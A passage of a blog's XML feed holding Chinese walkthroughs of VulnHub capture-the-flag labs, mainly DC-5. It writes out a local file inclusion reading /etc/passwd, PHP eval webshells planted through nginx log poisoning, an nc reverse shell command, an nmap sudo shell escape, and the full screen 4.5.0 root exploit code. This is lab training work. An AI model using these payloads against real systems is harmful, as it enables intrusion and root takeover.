alt="image-20240106204808230"></p><p>可以看到root</p><h4 id="7-提权成功"><a href="#7-提权成功" class="headerlink" title="7)提权成功"></a>7)提权成功</h4><p>百度到可以写入一条命令到getShell，并通过nmap运行getShell成功进入root用户，在&#x2F;root目录下找到theflag.txt文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'os.execute("/bin/sh")'</span> <span class="token operator">></span> getShell<span class="token function">sudo</span>  nmap  <span class="token parameter variable">--script</span><span class="token operator">=</span>getShell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106205045678.png" alt="image-20240106205045678"></p><h4 id="8-发现flag"><a href="#8-发现flag" class="headerlink" title="8)发现flag"></a>8)发现flag</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240106205128112.png" alt="image-20240106205128112"></p><h2 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h2><p>1.靶场下载地址 </p><p>2.nmap </p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto </p><p>8.wpscan </p><p>9.[ 隧道技术 ] 反弹shell的集中常见方式（一）nc反弹shell </p><p>10.[ 常用工具篇 ] burpsuite_pro 安装配置详解（附安装包） </p><p>11.简谈SUID提权 </p><p>12.实现交互式shell的几种方式 </p><p>13.修改hosts文件 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之DC-5</title>
    <link href="http://ms02423.top/2023/12/25/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-5/"/>
    <id>http://ms02423.top/2023/12/25/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BDC-5/</id>
    <published>2023-12-25T05:58:04.000Z</published>
    <updated>2024-01-06T06:04:47.104Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">DC-5 <span class="token keyword">is</span> another purposely built vulnerable lab <span class="token keyword">with</span> the intent <span class="token keyword">of</span> gaining experience <span class="token keyword">in</span> the world <span class="token keyword">of</span> penetration testing<span class="token punctuation">.</span>The plan was <span class="token keyword">for</span> DC-5 <span class="token keyword">to</span> kick it <span class="token keyword">up</span> a notch<span class="token punctuation">,</span> so this might <span class="token operator">not</span> be great <span class="token keyword">for</span> beginners<span class="token punctuation">,</span> but should be ok <span class="token keyword">for</span> people <span class="token keyword">with</span> intermediate <span class="token operator">or</span> better experience<span class="token punctuation">.</span> <span class="token keyword">Time</span> will tell <span class="token punctuation">(</span><span class="token keyword">as</span> will feedback<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">As</span> far <span class="token keyword">as</span> I am aware<span class="token punctuation">,</span> there <span class="token keyword">is</span> only one exploitable <span class="token keyword">entry</span> point <span class="token keyword">to</span> get <span class="token keyword">in</span> <span class="token punctuation">(</span>there <span class="token keyword">is</span> <span class="token keyword">no</span> SSH either<span class="token punctuation">)</span><span class="token punctuation">.</span> This particular <span class="token keyword">entry</span> point may be quite hard <span class="token keyword">to</span> identify<span class="token punctuation">,</span> but it <span class="token keyword">is</span> there<span class="token punctuation">.</span> You need <span class="token keyword">to</span> look <span class="token keyword">for</span> something a little out <span class="token keyword">of</span> the ordinary <span class="token punctuation">(</span>something that changes <span class="token keyword">with</span> a refresh <span class="token keyword">of</span> a <span class="token keyword">page</span><span class="token punctuation">)</span><span class="token punctuation">.</span> This will hopefully provide some kind <span class="token keyword">of</span> idea <span class="token keyword">as</span> <span class="token keyword">to</span> what the vulnerability might involve<span class="token punctuation">.</span><span class="token operator">And</span> <span class="token keyword">just</span> <span class="token keyword">for</span> the <span class="token keyword">record</span><span class="token punctuation">,</span> there <span class="token keyword">is</span> <span class="token keyword">no</span> phpmailer exploit involved<span class="token punctuation">.</span> <span class="token punctuation">:</span><span class="token operator">-</span><span class="token punctuation">)</span>The ultimate goal <span class="token keyword">of</span> this challenge <span class="token keyword">is</span> <span class="token keyword">to</span> get root <span class="token operator">and</span> <span class="token keyword">to</span> <span class="token keyword">read</span> the one <span class="token operator">and</span> only flag<span class="token punctuation">.</span>Linux skills <span class="token operator">and</span> familiarity <span class="token keyword">with</span> the Linux command <span class="token keyword">line</span> <span class="token keyword">are</span> a must<span class="token punctuation">,</span> <span class="token keyword">as</span> <span class="token keyword">is</span> some experience <span class="token keyword">with</span> basic penetration testing tools<span class="token punctuation">.</span><span class="token keyword">For</span> beginners<span class="token punctuation">,</span> Google can be <span class="token keyword">of</span> great assistance<span class="token punctuation">,</span> but you can always tweet me <span class="token keyword">at</span> @DCAU7 <span class="token keyword">for</span> assistance <span class="token keyword">to</span> get you going again<span class="token punctuation">.</span> But take note<span class="token punctuation">:</span> I wo<span class="token string">n't give you the answer, instead, I'</span>ll give you an idea about how <span class="token keyword">to</span> <span class="token keyword">move</span> forward<span class="token punctuation">.</span>But <span class="token keyword">if</span> you're really<span class="token punctuation">,</span> really stuck<span class="token punctuation">,</span> you can watch this video which shows the <span class="token keyword">first</span> step<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>只有一个flag</p><h2 id="2-下载靶场环境"><a href="#2-下载靶场环境" class="headerlink" title="2.下载靶场环境"></a>2.下载靶场环境</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>dc-5<span class="token punctuation">,</span><span class="token number">314</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载下来的文件</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140237807.png" alt="image-20231225140237807"></p><h2 id="3-启动靶场环境"><a href="#3-启动靶场环境" class="headerlink" title="3.启动靶场环境"></a>3.启动靶场环境</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140411377.png" alt="image-20231225140411377"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p><h1 id="二-渗透靶场"><a href="#二-渗透靶场" class="headerlink" title="二.渗透靶场"></a>二.渗透靶场</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶机真实IP"><a href="#1-寻找靶机真实IP" class="headerlink" title="(1)寻找靶机真实IP"></a>(1)寻找靶机真实IP</h3><p>使用nmap进行探活，寻找靶机ip</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -sP <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.0</span><span class="token operator">/</span><span class="token number">24</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140707890.png" alt="image-20231225140707890"></p><p>也可以使用arp-scan进行探活，寻找靶机ip</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225140851823.png" alt="image-20231225140851823"></p><p>本机ip为192.168.52.152<br>所以分析可得靶机ip为192.168.52.136</p><h3 id="2-探端口及服务"><a href="#2-探端口及服务" class="headerlink" title="(2)探端口及服务"></a>(2)探端口及服务</h3><p>使用nmap探活端口</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nmap -A -v -p- <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.136</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141324344.png" alt="image-20231225141324344"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开放了<span class="token number">80</span>端口，存在web服务，nginx <span class="token number">1.6</span><span class="token number">.2</span>发现开放了<span class="token number">111</span>端口，rpcbind 2-4发现开放了<span class="token number">58694</span>端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>也可以使用masscan探活端口</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">masscan --rate<span class="token operator">=</span><span class="token number">10000</span> --ports 0-65535 <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.136</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141551024.png" alt="image-20231225141551024"></p><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141800642.png" alt="image-20231225141800642"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web访问"><a href="#1-访问web访问" class="headerlink" title="(1)访问web访问"></a>(1)访问web访问</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225141852497.png" alt="image-20231225141852497"></p><p>发现有一个留言板，随便输入一下并提交</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142008963.png" alt="image-20231225142008963"></p><p>提交完成之后发现切入点,页面跳转到Thankyou.php，并且在URL地址栏可以看到参数，GET方式传参</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142106629.png" alt="image-20231225142106629"></p><p>突然发现这儿变成2018了，之前好像是2019</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142225101.png" alt="image-20231225142225101"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142240133.png" alt="image-20231225142240133"></p><p>琢磨琢磨，最后发现，只要一刷新页面，就会变，猜想存在文件包含</p><h3 id="2-bp是否存在文件包"><a href="#2-bp是否存在文件包" class="headerlink" title="(2)bp是否存在文件包"></a>(2)bp是否存在文件包</h3><p>使用BurpSuite抓包，爆破后台页面，由于是php站，我们选择php字典</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225142954512.png" alt="image-20231225142954512"></p><p>导入一个php字典，进行爆破</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225143207510.png" alt="image-20231225143207510"></p><p>发现存在index.php，solutions.php，about-us.php，faq.php，contact.php，thankyou.php，footer.php七个页面</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144602625.png" alt="image-20231225144602625"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144449486.png" alt="image-20231225144449486"></p><p>打开这几个页面，发现发开footer.php时，不断刷新，图标也在不断地变化，确认文件包含页面是footer.php</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144652807.png" alt="image-20231225144652807"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144708976.png" alt="image-20231225144708976"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20231225144730198.png" alt="image-20231225144730198"></p><h3 id="3-Fuzz确认存在文件包含漏洞"><a href="#3-Fuzz确认存在文件包含漏洞" class="headerlink" title="(3)Fuzz确认存在文件包含漏洞"></a>(3)Fuzz确认存在文件包含漏洞</h3><p>使用BurpSuite爆破文件包含的变量名即可能被包含的值</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.136</span><span class="token operator">/</span>thankyou<span class="token punctuation">.</span>php?<span class="token keyword">page</span><span class="token operator">=</span>footer<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择草叉模式进行爆破，选择两个爆破点，一个是文件包含变量名，一个是包含值</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152459936.png" alt="image-20240105152459936"></p><p>导入第一个字典，变量名字典</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152539472.png" alt="image-20240105152539472"></p><p>导入第二个字典（passwd路径字典）</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152615556.png" alt="image-20240105152615556"></p><p>成功爆破出八对值，但是只有一个变量名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152650601.png" alt="image-20240105152650601"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">/</span>thankyou<span class="token punctuation">.</span>php?<span class="token keyword">file</span><span class="token operator">=</span>%2e%2e%2fetc%2fpasswd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>访问最短的吧路径，成功包含到字典</p><p><a href="http://192.168.52.136/thankyou.php?file=/etc/passwd">http://192.168.52.136/thankyou.php?file=%2fetc%2fpasswd</a> </p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152834883.png" alt="image-20240105152834883"></p><p><a href="http://192.168.52.136/thankyou.php?file=/etc/passwd">http://192.168.52.136/thankyou.php?file=/etc/passwd</a></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105152905401.png" alt="image-20240105152905401"></p><h3 id="4-确认日志文件的位置"><a href="#4-确认日志文件的位置" class="headerlink" title="(4)确认日志文件的位置"></a>(4)确认日志文件的位置</h3><p>由于前面信息收集我们确认了是nginx的站，访问日志和错误日志应该如下<br><a href="https://blog.csdn.net/qq_36119192/article/details/102956230">Web日志目录及日志分析</a></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">access</span><span class="token punctuation">.</span>log<span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>nginx<span class="token operator">/</span><span class="token keyword">error</span><span class="token punctuation">.</span>log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>包含看一下</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153221281.png" alt="image-20240105153221281"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153250716.png" alt="image-20240105153250716"></p><h3 id="5-写入一句话木马"><a href="#5-写入一句话木马" class="headerlink" title="(5)写入一句话木马"></a>(5)写入一句话木马</h3><h4 id="1-写入phpinfo"><a href="#1-写入phpinfo" class="headerlink" title="1)写入phpinfo"></a>1)写入phpinfo</h4><p>写入phpinfo,访问如下日志文件，使用burpsuite抓包</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153616786.png" alt="image-20240105153616786"></p><p>我们使用burp进行抓包，在burp中写入一句话木马</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">GET <span class="token operator">&lt;</span>?php phpinfo<span class="token punctuation">(</span><span class="token punctuation">)</span>;?<span class="token operator">></span> HTTP<span class="token operator">/</span><span class="token number">1.1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>没有写入之前</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153818491.png" alt="image-20240105153818491"></p><p>写入之后</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105153949605.png" alt="image-20240105153949605"></p><p>重新打开日志文件可以看到成功写入，成功回显出phpinfo信息</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105154051732.png" alt="image-20240105154051732"></p><h4 id="2-写入webshell"><a href="#2-写入webshell" class="headerlink" title="2)写入webshell"></a>2)写入webshell</h4><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span>$_POST[<span class="token string">'ms02423'</span>]<span class="token punctuation">)</span>;?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>由于一些原因，靶机ip地址由192.168.52.136变成了192.168.52.128</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105194739666.png" alt="image-20240105194739666"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105194755495.png" alt="image-20240105194755495"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105194924650.png" alt="image-20240105194924650"></p><p>IP地址192.168.52.128</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195240841.png" alt="image-20240105195240841"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195259596.png" alt="image-20240105195259596"></p><p>3)连接蚁剑</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195327992.png" alt="image-20240105195327992"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195340657.png" alt="image-20240105195340657"></p><h4 id="3-新建shell文件"><a href="#3-新建shell文件" class="headerlink" title="3)新建shell文件"></a>3)新建shell文件</h4><p>可以在服务器&#x2F;tmp目录下新建一个webshell.php文件，写入一句话木马并重新连接</p><p>右键在tmp目录下新建php文件，名称为webshell.php</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195728613.png" alt="image-20240105195728613"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">欢迎访问webshell页面!!! <span class="token operator">&lt;</span>?php @eval<span class="token punctuation">(</span>$_REQUEST[powershell]<span class="token punctuation">)</span> ?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105195937931.png" alt="image-20240105195937931"></p><h4 id="4-我们访问新的页面"><a href="#4-我们访问新的页面" class="headerlink" title="4)我们访问新的页面"></a>4)我们访问新的页面</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200153964.png" alt="image-20240105200153964"></p><h4 id="5-蚁剑连接新的webshell"><a href="#5-蚁剑连接新的webshell" class="headerlink" title="5)蚁剑连接新的webshell"></a>5)蚁剑连接新的webshell</h4><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200328616.png" alt="image-20240105200328616"></p><p>连接成功右键进入虚拟终端</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200452842.png" alt="image-20240105200452842"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105200511440.png" alt="image-20240105200511440"></p><h3 id="6-反弹shell到kali"><a href="#6-反弹shell到kali" class="headerlink" title="(6)反弹shell到kali"></a>(6)反弹shell到kali</h3><p>蚁剑终端不如kali终端，我们反弹shell到kali(这里我没有成功，不知道什么原因)</p><p>我们在kali里面终端输入</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nc -lnvp <span class="token number">666666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们在蚁剑虚拟终端输入</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">nc -e <span class="token operator">/</span>bin<span class="token operator">/</span>bash <span class="token number">192.168</span><span class="token number">.52</span><span class="token number">.128</span> <span class="token number">666666</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="4-suid提权"><a href="#4-suid提权" class="headerlink" title="4.suid提权"></a>4.suid提权</h2><p>使用find命令，查找具有suid权限的命令</p><h3 id="1-发现screen-4-5-0"><a href="#1-发现screen-4-5-0" class="headerlink" title="(1)发现screen-4.5.0"></a>(1)发现screen-4.5.0</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现screen-4<span class="token punctuation">.</span><span class="token number">5.0</span>，使用<span class="token number">41145</span><span class="token punctuation">.</span>sh脚本提权GNU <span class="token keyword">Screen</span>是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU <span class="token keyword">Screen</span>可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>下面两条命令都行</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">find <span class="token operator">/</span> -user root -perm <span class="token number">-4000</span> -print <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span> find <span class="token operator">/</span> -perm -u<span class="token operator">=</span>s -type f <span class="token number">2</span><span class="token operator">></span><span class="token operator">/</span>dev<span class="token operator">/</span><span class="token keyword">null</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105220511216.png" alt="image-20240105220511216"></p><h3 id="2-查找screen-4-5-0漏洞脚本文件"><a href="#2-查找screen-4-5-0漏洞脚本文件" class="headerlink" title="(2)查找screen 4.5.0漏洞脚本文件"></a>(2)查找screen 4.5.0漏洞脚本文件</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">searchsploit <span class="token keyword">screen</span> <span class="token number">4.5</span><span class="token number">.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105220707539.png" alt="image-20240105220707539"></p><p>我们发现有两个发现screen 4.5.0 存在本地特权提升的漏洞，我们利用第一个，将脚本复制到本目录下</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">cp <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>exploitdb<span class="token operator">/</span>exploits<span class="token operator">/</span>linux<span class="token operator">/</span><span class="token keyword">local</span><span class="token operator">/</span><span class="token number">41154</span><span class="token punctuation">.</span>sh <span class="token punctuation">.</span><span class="token operator">/</span><span class="token number">41154</span><span class="token punctuation">.</span>sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105220909464.png" alt="image-20240105220909464"></p><h3 id="3-查看cat-41154-sh脚本文件"><a href="#3-查看cat-41154-sh脚本文件" class="headerlink" title="(3)查看cat 41154.sh脚本文件"></a>(3)查看cat 41154.sh脚本文件</h3><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221117944.png" alt="image-20240105221117944"></p><p>由于终端看的不全，我们在kali里面进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221228736.png" alt="image-20240105221228736"></p><h3 id="4-将第一部分内容写到libhax-c并编译"><a href="#4-将第一部分内容写到libhax-c并编译" class="headerlink" title="(4)将第一部分内容写到libhax.c并编译"></a>(4)将第一部分内容写到libhax.c并编译</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">按照脚本提示，先将第一部分内容写到libhax<span class="token punctuation">.</span>c中<span class="token punctuation">(</span>一共有三个部分<span class="token punctuation">)</span>创建一个文件夹存放三个部分的脚本<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221605803.png" alt="image-20240105221605803"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">创建libhax<span class="token punctuation">.</span>c文件，用vim编辑，当然，也可以直接使用vim创建文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105221749403.png" alt="image-20240105221749403"></p><p>写入如下文件</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token keyword">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">void</span> <span class="token function">dropshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">chown</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">04755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/etc/ld.so.preload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>确认文件写入成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105222042350.png" alt="image-20240105222042350"></p><p>然后编译这个脚本,查看编译生成的os文件</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">gcc -fPIC -shared -ldl -o libhax<span class="token punctuation">.</span>so libhax<span class="token punctuation">.</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105222145012.png" alt="image-20240105222145012"></p><h3 id="5-将第二部分的代码写入rootshell-c并编译"><a href="#5-将第二部分的代码写入rootshell-c并编译" class="headerlink" title="(5)将第二部分的代码写入rootshell.c并编译"></a>(5)将第二部分的代码写入rootshell.c并编译</h3><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">将第二部分的代码写入rootshell<span class="token punctuation">.</span>c文件并执行命令生成rootshell文件这里我直接采用vim创建文件因为步骤和第一部分是一样的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105222916118.png" alt="image-20240105222916118"></p><p>写入文件如下</p><pre class="line-numbers language-c#" data-language="c#"><code class="language-c#">#include &lt;stdio.h&gt;int main(void)&#123;    setuid(0);    setgid(0);    seteuid(0);    setegid(0);    execvp(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后编译这个脚本,查看编译生成的os文件</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">gcc -fPIC -shared -ldl -o rootshell<span class="token punctuation">.</span>so rootshell<span class="token punctuation">.</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105223042140.png" alt="image-20240105223042140"></p><h3 id="6-将第三部分代码写入dc5-sh文件"><a href="#6-将第三部分代码写入dc5-sh文件" class="headerlink" title="(6)将第三部分代码写入dc5.sh文件"></a>(6)将第三部分代码写入dc5.sh文件</h3><p>将最后一部分代码写入dc5.sh文件中。需要注意的是，需要在文件开头写入#!&#x2F;bin&#x2F;bash表示执行环境。最后保存是需要输入:set ff&#x3D;unix是为了防止脚本的格式错误。</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">#!<span class="token operator">/</span>bin<span class="token operator">/</span>bashecho <span class="token string">"[+] Now we create our /etc/ld.so.preload file..."</span><span class="token keyword">cd</span> <span class="token operator">/</span>etcumask <span class="token number">000</span> # because<span class="token keyword">screen</span> -D -m -L <span class="token keyword">ld</span><span class="token punctuation">.</span>so<span class="token punctuation">.</span>preload echo -ne  <span class="token string">"\x0a/tmp/libhax.so"</span> # newline neededecho <span class="token string">"[+] Triggering..."</span><span class="token keyword">screen</span> -ls # <span class="token keyword">screen</span> itself <span class="token keyword">is</span> setuid<span class="token punctuation">,</span> so<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">/</span>tmp<span class="token operator">/</span>rootshell <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol"><span class="token punctuation">:</span><span class="token keyword">set</span> ff<span class="token operator">=</span>unix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105224111589.png" alt="image-20240105224111589"></p><p>完成3个步骤后之间把三个文件上传至靶机的&#x2F;tmp文件下，然后执行.&#x2F;dc5即可提权。<br>将这三个文件传到靶机</p><h2 id="5-上传文件到蚁剑"><a href="#5-上传文件到蚁剑" class="headerlink" title="5.上传文件到蚁剑"></a>5.上传文件到蚁剑</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240105225226138.png" 